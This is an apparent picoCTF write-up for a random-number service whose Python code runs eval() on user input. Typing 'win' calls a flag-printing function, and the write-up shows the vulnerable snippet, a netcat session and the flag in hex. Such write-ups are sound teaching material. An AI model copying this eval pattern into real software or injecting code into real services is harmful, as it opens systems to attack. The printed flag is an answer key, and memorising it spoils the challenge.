# URL
https://play.picoctf.org/playlists/2?m=14

# Details
This service can provide you with a random number, but can it do anything else?
Connect to the program with netcat:
$ nc saturn.picoctf.net 64000
The program's source code can be downloaded here.

# Work

* The code has a win() function that prints the flag, so I know I have to reach here somehow
* Later down in the code, I see this:
``
 while(True):
  try:
    print('Try entering "getRandomNumber" without the double quotes...')
    user_input = input('==> ')
    eval(user_input + '()')
``

* The eval function (a huge security risk btw) takes our input + the parentheses
* Knowing this, I just typed win and look at what I get
``
┌──(kali㉿kali)-[~]
└─$ nc saturn.picoctf.net 63251
Try entering "getRandomNumber" without the double quotes...
==> win
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x62 0x35 0x32 0x33 0x62 0x32 0x61 0x31 0x7d 
Try entering "getRandomNumber" without the double quotes..
``
* I put the hexadecimal into an hex -> ascii converter and got the flag!
